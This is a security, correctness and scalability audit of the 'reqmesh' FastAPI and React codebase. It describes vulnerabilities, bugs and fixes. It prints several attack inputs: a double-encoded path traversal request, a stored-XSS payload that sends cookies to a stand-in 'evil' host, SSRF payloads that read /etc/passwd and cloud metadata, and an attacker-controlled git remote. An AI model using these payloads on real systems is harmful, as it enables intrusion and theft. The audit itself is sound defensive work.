# reqmesh — Security, Correctness & Scalability Audit

**Scope:** FastAPI backend + React/TS frontend (~33.7k lines, 148 routes)
**Working tree:** `e33facb` plus uncommitted changes
**Priorities as requested:** scalability, bug fixing, security
**Date:** 2026-07-25
**Last reconciled:** 2026-07-28

> This document absorbed the former `SEC_REVIEW.md` (v1.0, 25 July 2026), which
> reviewed the same codebase from the outside — it was written without access to
> the source tree and numbered its findings `F-01`…`F-29`. That review said of
> itself that it "should be reconciled against `AUDIT.md` before any work
> starts"; §6 below is that reconciliation. Its closed findings are recorded as a
> table rather than re-argued, since the code-level detail lives in §1–§3 here.

> ✅ **SEC-1 is FIXED** (see below) — the exploit no longer reproduces, and a regression test
> guards it. This document is now safe to commit alongside that fix. Do not push it *ahead* of
> the fix: the remote `github.com/CallumNunesVaz/reqmesh` is public, and §SEC-1 contains a
> working exploit against any unpatched deployment.

## Confidence legend

| Mark | Meaning |
|---|---|
| ✅ **VERIFIED** | Reproduced by executing the code against a throwaway instance. Failure and blast radius are established fact. |
| 📄 **STATIC** | Found by reading the source. Confirm with a reproduction before investing in a fix. |

Verified findings: **SEC-1, BUG-1, BUG-2, PERF-1**.

---

## Summary

| Area | Headline | Critical | High | Other |
|---|---|---:|---:|---:|
| Security | Path traversal into git; unescaped HTML in reports | 1 | 3 | 9 |
| Correctness | Two endpoints 500 on every call; silent data loss | 0 | 1 | 11 |
| Scalability | Every request re-parses every YAML file | 0 | 0 | 12 |

---

# 1. Security

## SEC-1 — Anonymous requests can run git commands in any repo on the host ✅ VERIFIED · 🛠 FIXED

**Severity: CRITICAL. Unauthenticated. Enabled by default.**

> **Status: fixed** in `backend/app/main.py:118-141`. The second `unquote` is gone, the segment
> is validated with `safe_id`, and the resolved path is checked to stay inside `data_root`.
> Regression test: `backend/tests/test_path_traversal.py` (6 tests). Confirmed the tests **fail**
> against the pre-fix code and pass after, and that legitimate auto-commit still works.

**Where:** `backend/app/main.py:119` (`git_autocommit_middleware`)

**Cause.** uvicorn already percent-decodes the request path (`uvicorn/protocols/http/h11_impl.py:188`).
The middleware then calls `unquote()` a **second** time and never validates through `safe_id`:

```python
_PROJECT_PATH_RE = re.compile(r"^/api/projects/([^/]+)(/.*)?$")   # main.py:84
...
project_id = unquote(m.group(1))                                   # main.py:119  ← 2nd decode
project_root = Path(settings.data_root) / project_id               # main.py:120  ← no safe_id
```

The regex segment `([^/]+)` matches `%2e%2e%2f…` as a *single* segment because it contains no
literal slash yet — the second `unquote` then turns it into `../`.

The `status_code < 400` guard is bypassed by Starlette's `redirect_slashes`, which returns
**307** without ever invoking a route handler, an auth dependency, or `get_store`/`safe_id`.

**Reproduction (executed):**

```
POST /api/projects/%252e%252e%252fvictim_repo/requirements/

  uvicorn decodes once  -> /api/projects/%2e%2e%2fvictim_repo/requirements/
  regex ([^/]+) matches -> "%2e%2e%2fvictim_repo"
  main.py:119 unquote   -> "../victim_repo"        <-- escapes data_root

status: 307                                        <-- passes the <400 guard
BEFORE: a26fd49 initial
AFTER : 83bbd98 rt: post requirements              <-- commit in a FOREIGN repo
        private_notes.txt | 1 +
        tracked.txt       | 2 +-
```

**Impact.**
- Runs `git add -A && git commit` in any host directory that is a git repo, capturing the
  developer's uncommitted work into a commit.
- Arbitrary file read into control flow — `_project_git_config()` reads `<target>/_meta.yaml`.
- If `push_on_commit` + a remote are configured, `ensure_remote()` **rewrites that repo's
  `origin`** and pushes it off-box (exfiltration + destruction of remote config).
- `event_bus.publish()` called with unbounded attacker-chosen keys.
- `git_autocommit` defaults to `True` (`config.py:15`), so this is on out of the box.

**Fix.**
```python
from app.core.ids import safe_id
try:
    project_id = safe_id(m.group(1), "project id")   # no unquote()
except HTTPException:
    return response
```
Plus defence in depth: `project_root.resolve().is_relative_to(Path(settings.data_root).resolve())`.

---

## SEC-2 — Stored XSS in exported HTML reports 📄 STATIC · 🛠 FIXED

**Severity: HIGH**

> **Status: fixed** by a new `backend/app/services/sanitize.py` (stdlib `html.parser`, allowlist
> only — no new pinned dependency). Applied at **both** boundaries:
> - **On write** — `field_validator` on `RequirementCreate`/`RequirementUpdate.description`,
>   so a direct `PUT` can no longer persist a payload.
> - **On output** — `publisher.py` sanitises before interpolating, which is what covers the
>   descriptions already stored before this existed.
>
> The allowlist deliberately mirrors the frontend's read-only renderer
> (`autoLink.tsx::ALLOWED_TAGS`) so both surfaces agree. `script`/`style`/`iframe`/`object`/
> `embed`/`svg`/`math` are dropped *with their contents*; all other unknown tags unwrap; every
> attribute is stripped except a `data:`-only `src` on `<img>`.
> Tests: `backend/tests/test_html_sanitisation.py` (22).
**Where:** `backend/app/services/publisher.py:610,641`

Every neighbouring field is escaped (`esc(rid)`, `esc(name)`, `rationale`, `source`) —
`description` alone is interpolated raw:

```python
desc = r.get("description", "").replace("<p>", "").replace("</p>", "")   # :610
...
{f'<div class="desc">{desc}</div>' if desc else ''}                      # :641
```

There is **no server-side sanitisation** on the write path either — `RequirementUpdate.description`
is a plain `str`, and TipTap's cleaning is client-side, bypassed by calling the API directly.

**Impact.** Persistent; fires for whoever opens the exported report.
Payload: `{"description": "<img src=x onerror=fetch('https://evil/'+document.cookie)>"}`.
Mitigated somewhat by the attachment `Content-Disposition` (not same-origin against the app).
The in-app renderer is **safe** — `frontend/src/components/autoLink.tsx:54-86` parses into an
inert document with a tag allowlist and drops all attributes.

**Fix.** Sanitise server-side on write against TipTap's tag set; reuse that allowlist at :641.

---

## SEC-3 — PDF export fetches attacker-controlled URLs (SSRF + local file read) 📄 STATIC · 🛠 FIXED

**Severity: HIGH**

> **Status: fixed** at two layers. The sanitiser (SEC-2) already reduces `<img src>` to `data:`
> URIs, and `sanitize.safe_url_fetcher()` now backs both WeasyPrint call sites
> (`extra_routes.py`, `publisher.to_pdf_file`) so anything else is refused outright.
>
> Note it is **not** a blanket `data:`-only clamp: the report logo is an operator-configured
> "URL or data: URI" (`report_logo_url`), so that exact URL is allowlisted and its scheme is the
> only extra one enabled. Redirects are disabled so an allowlisted host can't bounce the fetch
> to an internal address. Uses the modern `URLFetcher` rather than the deprecated
> `default_url_fetcher` (removed in the pinned WeasyPrint 69.0).
>
> Verified end-to-end: a requirement containing `<img src="file:///…secret">` renders a PDF that
> does **not** contain the file's bytes.
**Where:** `backend/app/api/extra_routes.py:915`

```python
WHTML(string=pub.build_html(...)).write_pdf(path)
```

The same unescaped description (SEC-2) reaches WeasyPrint with its **default** `URLFetcher`,
which registers `file://`, `http://`, `https://` and `ftp://` handlers with
`allowed_protocols=None` (all allowed).

**Impact.** `<img src="file:///etc/passwd">` or `<img src="http://169.254.169.254/latest/meta-data/...">`
is fetched server-side and rendered into a PDF the attacker then downloads. Ignores `offline_mode`.

**Fix.** `WHTML(string=..., url_fetcher=URLFetcher(allowed_protocols=('data',), allow_redirects=False))`.

---

## SEC-4 — Maintainers can retarget the git remote; credentials logged verbatim 📄 STATIC · 🛠 FIXED

**Severity: HIGH**
**Where:** `backend/app/api/router.py:126-140`, `backend/app/services/git_service.py:107-186`

`ProjectSettings.git` is a free-form `Optional[dict]` written straight into `_meta.yaml` behind
only `require_maintain`. Setting `{"remote_url": "https://attacker/x.git", "push_on_commit": true}`
ships the whole project history off-box on the next mutation, and doubles as a blind SSRF
primitive against internal hosts (`http://169.254.169.254/…`, `ssh://internal:22/…`).

Credential leakage — URLs of the form `https://user:token@host/repo.git` are logged verbatim:
```
git_service.py:123  logger.info("git remote origin updated to %s in %s", remote_url, ...)
git_service.py:130  logger.info("git remote origin set to %s in %s", remote_url, ...)
git_service.py:179  logger.warning("git push failed in %s: %s", project_root, result.stderr)
```

**Fix.** Admin-gate `remote_url`; allowlist schemes/hosts; redact userinfo before logging
(`re.sub(r"//[^/@]+@", "//***@", url)`); honour `offline_mode` in `ensure_remote`.

---

## SEC-5 — All read endpoints are unauthenticated; `permissions` is not writable 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM (design decision required)**

Not a single `@router.get` carries a `Depends(...)` guard. `GET /api/projects`, `/requirements`,
`/publish/download`, `/git/log`, `/metrics`, `/quality`, `/evaluation`, `/presence` and `WS /ws`
are fully anonymous. `get_current_user` silently degrades an invalid/expired token to
`GUEST_USER` (`dependencies.py:55-62`) rather than returning 401.

Additionally, `get_project_permissions` reads `meta["permissions"]` (`dependencies.py:27`) but
**nothing writes that key** — `ProjectSettings` (`router.py:115-121`) has no `permissions` field.
So the per-project permission map is currently unreachable in practice, and there is no way to
make a project non-public. `PERMISSION_LEVELS` also has no level below `view`.

**Fix.** Add a real `view` gate to read routes, and expose `permissions` on `ProjectSettings`
(admin-only) — or document explicitly that all project data is world-readable by design.

---

## SEC-6 — Unauthenticated arbitrary-file existence/content oracle 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM**
**Where:** `backend/app/api/extra_routes.py:969-972` → `backend/app/services/references.py:16-38`

```python
@router.get("/projects/{project_id}/references/freshness")   # no Depends — anonymous
async def reference_freshness(project_id: str):
    return check_reference_freshness(get_store(project_id), Path.cwd())
```

`Reference.path` is a free-form `str`, and `Path("/cwd") / "/etc/shadow" == Path("/etc/shadow")` —
absolute paths and `../` both escape. A maintainer plants a reference; **anyone** then reads an
existence + content-match (sha256) oracle from an anonymous endpoint. Using `Path.cwd()` as the
code root is itself wrong — it should be `store.root`.

**Fix.** Pass `store.root`, add `.resolve().is_relative_to(store.root.resolve())`, put the
endpoint behind auth.

---

## SEC-7 — Rate limiting: auth-only, and broken behind the reverse proxy 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM**
**Where:** `backend/app/core/rate_limit.py:6-21`

```python
ip = request.client.host if request.client else "unknown"    # rate_limit.py:11
```

`nginx.conf` and `Caddyfile` both terminate in front of the app, and neither `Dockerfile.prod`
nor `start.sh` passes `--proxy-headers` / `--forwarded-allow-ips`. So `request.client.host` is
the **proxy's** IP for every user: the whole instance shares one 5-logins/minute bucket — a
trivial lockout DoS for all users.

Rate limits exist only on the 7 auth routes. Unlimited: all CRUD, bulk ops, `POST /import`,
`POST /publish`, `GET /publish/download` (expensive LaTeX/WeasyPrint render), `GET /evaluation`,
`POST /evaluation/impact`, `POST /scan`, SSE and WebSocket connections.

`_window_attempts` is an unbounded module-level `defaultdict` keyed by `ip:path`, never evicted.
There is also no global request-body size cap — file uploads are capped
(`extra_routes.py:44-58`) but JSON bodies are not.

**Fix.** Run uvicorn with `--proxy-headers --forwarded-allow-ips <proxy>`; use the left-most
untrusted `X-Forwarded-For` hop; evict empty buckets; add a `Content-Length` cap middleware;
rate-limit the expensive read routes.

---

## SEC-8 — Passwords longer than 72 bytes return 500 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM**
**Where:** `backend/app/core/auth.py:94-99`

`_validate_password` sets a 12-char minimum and no maximum. bcrypt 5.0.0 (pinned) **raises**
rather than truncating, so `POST /auth/login` and `/auth/register` with a 100-byte password
return **500**. The login path also skips the failed-attempt counter (`auth.py:155-162`), making
it an un-lockout-counted probe.

**Fix.** `if len(password.encode()) > 72: raise HTTPException(400, ...)`, or pre-hash with SHA-256.

---

## SEC-9 — Update bundles have no signature or checksum 📄 STATIC

**Severity: MEDIUM**
**Where:** `backend/app/services/bundle_update.py:171-231,300-362`

`stage_from_archive` validates only *layout* (top-level dir, `manifest.json`, `backend/app` +
`frontend/dist` present) and that the version is newer. No signature, no SHA-256 pin, no
provenance. The staged tree is swapped in and `os.execv`'d, and the bundle's `requirements.txt`
is fed to pip — which can carry `--index-url` / direct URLs, pulling arbitrary code:

```python
cmd = [sys.executable, "-m", "pip", "install", "--quiet", "-r", str(requirements)]   # :362
```

Admin-gated, but it turns any admin-session compromise into permanent RCE.
(`_safe_extract` itself at `:154-168` is correctly written — rejects escaping members, symlinks,
and passes `filter="data"`.)

**Fix.** Require a detached signature or an operator-supplied SHA-256 over the tarball;
run pip with `--require-hashes` or `--no-index --find-links <bundle/wheels>`.

---

## SEC-10 — Lower severity 📄 STATIC

| Item | Where | Note |
|---|---|---|
| Generated admin password written to log | `auth.py:53-59` | Lands in `docker logs`/journald, persists long after first boot |
| Secret/users file briefly world-readable | `auth.py:36-39,71` | `write_text` then `chmod` — TOCTOU window at 0644; use `os.open(..., 0o600)` |
| Username enumeration + lockout DoS | `auth_routes.py:72-79` | Distinguishable 403 vs 401; 5 requests locks any known account |
| Formula injection in CSV/XLSX export | `table_io.py:131-145,237` | openpyxl writes a leading `=` as a live formula; prefix `^[=+\-@\t\r]` with `'` |
| Billion-laughs on ReqIF import | `reqif_import.py:19,174` | XXE is safe, internal entity expansion is not; use `defusedxml` |
| `allowed_hosts` is dead config | `config.py:72` | Declared but `TrustedHostMiddleware` never added |
| CORS wildcard reachable via env | `main.py:77-83` | Default is safe; `RT_CORS_ORIGINS='["*"]'` + credentials is not |
| `docker-compose.prod.yml` crash-loop | — | `RT_CORS_ORIGINS=${RT_CORS_ORIGINS:-}` → empty string → pydantic parse error at import |
| Scanner follows directory symlinks | `code_scan.py:139` | `rglob` fallback escapes the `relative_to` confinement on Python < 3.13 |
| `python-multipart==0.0.9` | `requirements.txt` | CVE-2024-53981 (multipart DoS), fixed in 0.0.18 |

## SEC-11 — Dependency CVEs blocked behind major upgrades 📄 STATIC

**Severity: MEDIUM (runtime), LOW (dev toolchain)**

Recorded 2026-07-31, when the `security` workflow first ran against `main` after
v0.1.13. None of these were introduced by that release — no dependency manifest
had changed since v0.1.12; the advisories accumulated while `main` sat unpushed.

Cleared in that pass: `python-multipart` 0.0.19 → 0.0.31 (6 CVEs), `postcss`
→ 8.5.25 (1 high). Remaining, each needing a breaking upgrade:

| Item | Where | Note |
|---|---|---|
| `starlette` 0.38.6 — 9 CVEs | transitive via `fastapi==0.115.0` | Not pinned directly; `fastapi<0.39` caps it below the first fix (0.40.0), and clearing all nine needs ≥1.3.1. `fastapi` 0.141.1 requires `starlette>=0.46.0` with **no upper bound**, so bumping fastapi is the whole fix — but starlette 0.x→1.x is the breaking line. **This keeps `python-audit` red.** |
| `vite` 5.4.21, `vitest` 2.x — 1 high + 1 critical | `frontend/devDependencies` | Dev-server advisories; nothing reaches the built artifact. `node-audit` now runs `--omit=dev` so they no longer gate releases. Fix is vite 5→8 / vitest 2→4. |
| `react-router-dom` ^6 — open redirect + constructor injection | `frontend/dependencies` | **Runtime**, but moderate, so below the job's `--audit-level=high` gate. Every 6.x is affected (range 6.0.0–7.17.0); fix starts at 7.18.0, a major. |

**Fix.** Take the fastapi bump first — it is the only one of the three that is
both runtime-facing and fully blocking a CI job, and 693 backend tests exist to
catch the starlette API changes.

---

## Verified safe (no action needed)

- **YAML deserialization is NOT vulnerable** — all four `yaml.load()` sites use `ruamel.yaml`,
  whose default `YAML()` is `typ='rt'` → `RoundTripConstructor`, a subclass of `SafeConstructor`.
  Arbitrary object construction is not possible.
- **JWT is sound** — `HS256` pinned on both sides (no `alg:none`/confusion), `exp` verified,
  role re-read from disk rather than trusted from the token, `token_version` enforced.
  Secret is `secrets.token_hex(32)` at `0600`.
- **Path traversal via entity IDs is blocked** — `safe_id` is enforced centrally in
  `_item_path`, `history_dir` and `get_store`. (SEC-1 and SEC-6 bypass it by not going through
  those paths.)
- **No command injection** — every `subprocess.run` uses list-form argv, no `shell=True`;
  `restore_commit` re-resolves through `rev-parse`.
- **LaTeX injection is not possible** — `_latex_escape` handles the backslash-first sentinel correctly.
- **Email header injection is not possible** — Python's generator raises on embedded newlines.
- **The parametric expression evaluator is a strict AST allowlist** — no `Subscript`/`Lambda`/
  attribute chaining.
- **Electron is hardened** — `contextIsolation: true`, `nodeIntegration: false`, window-open handler.
- No secrets tracked in git.

---

# 2. Correctness

## BUG-1 — Both bulk change-request endpoints 500 on every call ✅ VERIFIED · 🛠 FIXED

**Severity: HIGH**

> **Status: fixed.** Collection renamed to `change_requests` in all three places
> (`extra_routes.py:509,519,522`), and `_item_path` now raises `HTTPException(400)` instead of a
> bare `ValueError` so the next typo is a bad request, not a 500.
> Tests: `backend/tests/test_corrupt_and_bulk.py::TestBulkChangeRequests` (4).
**Where:** `backend/app/api/extra_routes.py:509,519,522`

Collection named `"change-requests"` (hyphen); the store registers `"change_requests"`
(underscore, `yaml_store.py:53`). `_item_path` raises a bare `ValueError`, which is not an
`HTTPException` → 500. Every other CR route uses the underscore.

**Reproduction (executed):**
```
POST /api/projects/p/change-requests/bulk        -> 500
POST /api/projects/p/change-requests/bulk-delete -> 500
POST /api/projects/p/risks/bulk  (control)       -> 400   <-- correct behaviour
```
```
ValueError: Unknown collection: change-requests
  at yaml_store.py:129 _item_path
```

Shipped and **entirely untested** — no test touches these routes.

**Fix.** Rename to `change_requests` in all three places; make `_item_path` raise
`HTTPException(400)` so the next typo is a 400, not a 500.

---

## BUG-2 — One malformed YAML file takes down five endpoints ✅ VERIFIED · 🛠 FIXED

**Severity: HIGH**

> **Status: fixed.** `_parse_yaml` now raises on malformed content; `_read_yaml` stays tolerant
> only for structural files (meta, traces, history). `list_items` genuinely skips unparseable
> files *and* files missing an `id`, logging the real error. Two follow-ons that fell out of the
> same defect:
> - `update_item` refuses (**409**) rather than merging into a file it couldn't parse — that path
>   would otherwise have replaced the user's recoverable broken file with just the patch fields.
> - New `store.corrupt_files()` surfaces skipped files through `/validate` as a `corrupt_file`
>   issue, so corruption is **reported** instead of silently vanishing from the UI.
>
> Tests: `backend/tests/test_corrupt_and_bulk.py::TestCorruptYamlIsSkippedNotFatal` (5).
**Where:** `backend/app/services/yaml_store.py:132-143`

`_read_yaml` (`:91-98`) catches everything and returns `{}`, so the outer
`except Exception: log("Corrupt YAML skipped")` in `list_items` is **dead code** — the empty
dict is appended to the collection instead of being skipped. Downstream `req["id"]` raises
`KeyError`.

**Reproduction (executed)** — one requirement file hand-broken with an unterminated quote,
exactly as a user editing YAML in git might:
```
list_requirements() -> [ {...R1}, {}, {...R3} ]     <-- bare {} instead of a skip

GET /evaluation    -> 500        GET /coverage     -> 500
GET /validate      -> 500        GET /quality      -> 500
GET /metrics       -> 500        GET /requirements -> 200
```
The "Corrupt YAML skipped" warning never fires, so the cause is invisible.

**Fix.** Let `_read_yaml` raise (or return a sentinel); have `list_items` genuinely skip and log
the parse error. Surface skipped files in `/validate` so corruption is visible, not fatal.

---

## BUG-3 — Trace matrix deletes the wrong link when a filter is active 📄 STATIC · 🛠 FIXED

**Severity: HIGH (silent, unrecoverable)**

> **Status: fixed.** `removeLink` now takes the link object, not a row index, and delegates to
> a new pure helper `frontend/src/lib/traceLinks.ts::removeTraceLink` (identity-based, so a
> duplicate source/target/type pair still removes only the clicked row, and a missing link is a
> no-op instead of a pointless write).
> Tests: `frontend/tests/traceLinks.test.ts` (4), including one that reproduces the old
> index-based behaviour and asserts it deleted the wrong element.
**Where:** `frontend/src/pages/TraceMatrixPage.tsx:228,248` → `:89-96`

The list renders `filteredLinks` but passes that row index to `removeLink`, which splices the
**unfiltered** `links` array:

```tsx
{filteredLinks.map((link, i) => ( ... onClick={() => removeLink(i)} ...
const removeLink = async (index: number) => {
  const updated = links.filter((_, i) => i !== index);   // indexes `links`, not `filteredLinks`
```

**Repro.** 10 links; filter so only `links[7]` and `links[9]` show. Click X on the second visible
row (`i === 1`) → `links[1]`, an unrelated link, is deleted and PUT to the server; the row you
clicked remains. Traces have no history entry and no undo, so this is silent and unrecoverable.

**Fix.** Filter by identity: `links.filter(l => l !== link)`.

---

## BUG-4 — Whole-document writes with no locking or version check 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM–HIGH (lost updates)**

`_file_lock` (`yaml_store.py:21-39`) exists but is used in exactly **one** place — `update_item`
(`:162`). `create_item`, `write_item`, `delete_item` and `write_traces` are unlocked.

- **Traces** — `PUT /traces` (`router.py:766-770`) blind-replaces the file from the client's
  page-load snapshot. Alice opens the matrix at 09:00, Bob adds 5 links, Alice saves at 10:00 →
  Bob's links are gone, no error, no history entry.
- **Users** — `load_users`/`save_users` (`auth.py:47-91`) has no lock, and `authenticate` rewrites
  the whole file on **every login attempt**. A login racing `delete_user` **resurrects the
  deleted account** with a valid token already issued.
- **Cascade** — `router.py:329-341` writes a stale full-document snapshot to each child
  (`store.update_requirement(r["id"], r)`), clobbering fields another request changed in between.
  It also only propagates one level deep — a REQ → C1 → C2 chain leaves C2 stale forever.

**Fix.** Reuse `_file_lock` around every load→save pair; send only changed fields in the cascade
and iterate transitively with a visited set; add an ETag/version on `traces.yaml`.

---

## BUG-5 — `mode=replace` import deletes everything before parsing 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM–HIGH (data loss)**

> **Status: fixed.** Imports are now parse-then-write in both paths:
> - `table_io.import_table` parses every row up front (and reuses that result rather than
>   re-parsing), so a malformed row raises before anything is deleted. The `get()` helper now
>   coerces `DictReader`'s trailing `None` to the caller's default, so ragged rows import cleanly.
> - `mode=replace` **refuses** when no row yields an id — the unrecognised-header case that used
>   to wipe the project and return `200 {"created": 0}`.
> - `importer.import_into_store` normalises requirements *and* components before the delete pass,
>   so a bad `quantity` can no longer empty requirements/VCs/components.
> - The CSV/TSV/XLSX branches of `POST /import` now map `ValueError` to **400** (only the
>   ReqIF/SysML branch did), so these guards surface as bad requests, not 500s.
>
> Tests: `backend/tests/test_import_destructive.py` (7), all asserting the project is byte-for-byte
> unchanged after a failed import.
**Where:** `backend/app/services/table_io.py:162-189`, `importer.py:99-105`

Deletion happens first, parsing second. `csv.DictReader` fills missing trailing fields with
`None`, and `row.get(key, "")` returns `None` when the *key exists*, so `None.strip()` raises
`AttributeError` on any ragged row (a truncated last line, a ragged Excel export):

```python
rel_str = get("relations", "")
if rel_str.strip():          # AttributeError when the column exists but the row is short
```

**Result:** all requirements deleted, request 500s, zero imported.
Worse — a header whose id column isn't recognised (e.g. `Requirement Identifier`) deletes
everything and returns a cheerful **200** with `{"created": 0, "skipped": N}`.

**Fix.** Coerce `None` → default; parse *all* rows before deleting anything; wrap in a
transaction-style restore on failure.

---

## BUG-6 — Deleting a parent orphans children out of the tree 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM**
**Where:** `backend/app/core/tree_utils.py:18-26`, `router.py:345-352`

`build_flat_tree` only emits nodes reachable from `parent is None`, and `delete_requirement`
neither reparents nor nulls children's `parent` (unlike `bulk_delete_components`, which does
promote children). Deleting REQ0001 makes REQ0002 vanish from `/requirements/tree` and therefore
from the nav — while still existing on disk and in the list page, which reads as corruption.

The same function silently drops an entire subtree on a **parent cycle**, and nothing prevents
one: the parent `<select>` offers every requirement including the node's own descendants, and
the backend performs no ancestor check.

**Fix.** Treat items whose `parent` isn't in the id set as roots; track a `seen` set while
recursing; add a cycle check to `update_requirement`; reparent children on delete.

---

## BUG-7 — Failed undo wedges the undo stack permanently 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM**
**Where:** `frontend/src/store/undo.ts:45-57`

```ts
const entry = undoStack[undoStack.length - 1];
await entry.undo();                                   // throws -> nothing below runs
set((s) => ({ undoStack: s.undoStack.slice(0, -1) })); // never pops
```

`Layout.tsx` calls it without `.catch()`, so the rejection is an unhandled promise rejection with
**no user-visible feedback**. Delete a requirement, have a collaborator recreate it, press Ctrl+Z
→ 409 → the entry stays on top and every subsequent undo retries the same failing entry, making
all older history unreachable. Bulk-delete undo is worse: a mid-loop failure restores some items,
leaves others, and can never be retried successfully.

**Fix.** `try/catch/finally` with a guaranteed pop and a surfaced error; `Promise.allSettled` for
bulk undo with partial-failure reporting.

---

## BUG-8 — Unguarded concurrent fetches (stale data overwrites fresh) 📄 STATIC · 🛠 FIXED

**Severity: MEDIUM**

- `GraphPane.tsx:600-625` — `loadData()` fires four parallel requests and unconditionally sets
  state, re-invoked on every `graphVersion` bump. Ctrl+Z (slow request A) then an SSE change
  (fast request B) → B renders correctly, then A lands and reverts the graph to the **pre-undo**
  state until the next mutation. The ELK layout *does* have a guard; the data fetch does not.
- `RequirementNav.tsx:251-254` — `getRequirementTree(...).then(setTree)` with no `alive` guard,
  while the effect 10 lines below correctly uses one. Fast project switching leaves project A's
  tree under project B; clicking a node 404s.
- `RequirementDetailPage.tsx:131-176` — 14 unguarded `.then(setX)` calls, and the page is not
  remounted per requirement (no route key). Click REQ0001 then REQ0002 quickly → REQ0001's
  response lands last and sets `savedRef`; pressing Delete then deletes **REQ0002** while the
  undo entry snapshots **REQ0001**, making REQ0002 unrecoverable.

**Fix.** The `let alive = true` / `AbortController` pattern already used elsewhere in the same
files; add `key={reqId}` to the detail route.

---

## BUG-9 — Evaluator crash inputs and non-determinism 📄 STATIC · 🛠 PARTIALLY FIXED

**Where:** `backend/app/services/evaluation.py`

| Line | Issue |
|---|---|
| `:484` | `c.get("expr", "")` returns `None` when the key exists but is null → `ast.parse(None)` raises **`TypeError`**, and `dim_of_expr` (`:277`) only catches `SyntaxError`. Verified: `ast.parse(None)` → `TypeError: compile() arg 1 must be a string...`. `_constraint_verdict:386` uses the correct `or ""` form. |
| `:444`, `:524` | `float(m["value"])` / `float(v)` — a measurement or override of `"n/a"` 500s the whole endpoint. |
| `:648`, `:661` | `list(affected_refs)` iterates a **set**, so impact-step order is hash-randomised per process — the what-if animation plays in a different order across restarts. Use `sorted(...)`. |
| `:608`, `:682` | Exact float equality (`b != o`, `b_val == o_val`) — a 1e-16 drift marks a parameter impacted. Use `math.isclose` matching the 6-dp display rounding. |
| `:582-586` | `_resolve_safe` catches bare `Exception`, making "unknown value" and "broken expression" indistinguishable; an erroring constraint shows `before: null / after: null` and is then dropped. |
| `:135-146` | `rollup` recursion is unbounded — a component chain > ~1000 raises `RecursionError` (neither `EvalError` nor `UnknownValue`) → 500. Cyclic trees *are* handled correctly. |
| `:362` | `if bound:` correctly avoids ÷0 but also skips legitimate `bound == 0.0`, so `x > 0` constraints never get a `pct`. |

Also `integrity.py:116-140` — Tarjan's `strongconnect` is **recursive**; a deep `derives` chain
hits Python's 1000-frame limit and 500s `/validate`.

---

## BUG-10 — Failed writes reported as success 📄 STATIC

**Severity: MEDIUM (user trust)**

- `RequirementDetailPage.tsx:322-343` `addRelation` — `catch {}` swallows every error, then
  clears the input and bumps the graph. A typo'd target 404s and looks like it worked.
- `RequirementsPage.tsx:651-653` `handleDelete` — `catch {}`; a 500 is indistinguishable from success.
- `RequirementDetailPage.tsx:1138` comment submit — `catch {}`, no message at all.
- `extra_routes.py:95,111,156,172,219,279,295` — `except Exception: pass` around every email
  notification with **no log line**, making SMTP misconfiguration undiagnosable.
- `flipRelation` and "Mark Reviewed" write to the API without updating `savedRef.current`, so a
  later "Discard changes" reverts the UI to pre-flip state while the server holds the new one.

---

## BUG-11 — Durability and workflow 📄 STATIC

- `yaml_store.py:100-113` — `_write_yaml` never `fsync`s before `os.replace`, yet the class
  docstring claims "a crash mid-write never leaves a truncated file". `os.replace` is atomic
  w.r.t. the *rename*, not the data. Add `f.flush(); os.fsync(f.fileno())`, ideally fsync the
  parent dir too.
- `workflow.py:40-46` — a partial workflow bricks all status changes. `workflow: {states: [draft, final]}`
  with no `transitions` falls back to `DEFAULT_TRANSITIONS`, which is keyed by the *default*
  states → `allowed = []` → **every** transition 400s. Derive defaults from the custom `states`.
- `extra_routes.py:392-395` — deleted components' children are promoted but no history entry is
  recorded, so the reparent is invisible in the audit trail and not undoable.
- `WhatIfContext.tsx:98-121` — `setBase(...)` and a timer are scheduled *inside* the
  `setOverrides` updater (impure; double-invoked under StrictMode). `confirm` does
  get→update per requirement with no version check, pushes nothing onto the undo stack, and on a
  mid-loop failure leaves a partial commit with overrides still applied.

---

# 3. Scalability

## PERF-1 — Every list call re-parses every file, with the slowest loader ✅ VERIFIED · 🛠 FIXED

**Severity: HIGH (root cause of most items below)**
**Where:** `backend/app/services/yaml_store.py:41,132-143`

```python
yaml = YAML()                        # :41  — round-trip: the slowest mode available

def list_items(self, collection):    # :132 — no cache, no index, no mtime check
    for f in sorted(d.glob("*.yaml")):
        items.append(self._read_yaml(f))
```

**Measured (this machine, representative requirement document):**

| loader | per doc | 1k docs | 10k docs |
|---|---:|---:|---:|
| ruamel `YAML()` round-trip (in use) | **1.911 ms** | 1.9 s | **19.1 s** |
| ruamel `YAML(typ='safe')` | 0.292 ms (6.5×) | 0.3 s | 2.9 s |
| pyyaml `CSafeLoader` (libyaml) | 0.103 ms (18.6×) | 0.10 s | 1.0 s |

A single Metrics page load costs **~14 full collection scans**; `/validate` alone costs 5;
`POST /evaluation/impact` costs 7 and builds 4 `Evaluator`s — and the frontend fires it on every
what-if keystroke.

> ⚠️ **Do not swap the loader globally.** Verified: round-trip is what preserves user comments in
> hand-edited YAML — a core promise of a git-native tool.
> ```
> round-trip load -> edit -> dump : "# Safety-critical: reviewed by CE board" PRESERVED
> safe load       -> edit -> dump : comment SILENTLY STRIPPED
> ```
> Use the fast loader on the **read-only list path** (where all the cost is) and keep round-trip
> for the read-modify-write path (`update_item`).

**Fix.** Fast loader for `list_items` + an mtime/size-keyed collection cache
(`dict[collection] -> (dirstat, {id: doc})`), invalidated by comparing `os.scandir` mtimes
(~1 ms for 10k entries vs 19 s). ~40 lines confined to one file. Add `os.fsync` while there
(BUG-11).

---

## PERF-2 — Quadratic and N+1 hot paths 📄 STATIC

| Where | Problem |
|---|---|
| `fingerprint.py:111-118` + `:87-92` | `review_all` → `review_item` per requirement, each re-listing the whole collection. **O(n²) parses** on a plain POST. Reachable via `/review-all` and `/suspect-links/clear`. |
| `publisher.py:338-344` | `_entity_label` runs 3 full scans **per changelog entry**, called twice per entry. A changelog export over a large history never returns. |
| `yaml_store.py:282-312` | `list_all_history` parses **every** history file before applying the date filter — and the date is already in the filename. Grows unbounded (10k reqs × 20 edits = 200k files). |
| `tracing.py:14-24` | The `for vc in vcs` loop is nested inside the `for req in reqs` loop for a bit-identical result. 10k × 1k × 3 = 30M redundant set ops per `/coverage`. |
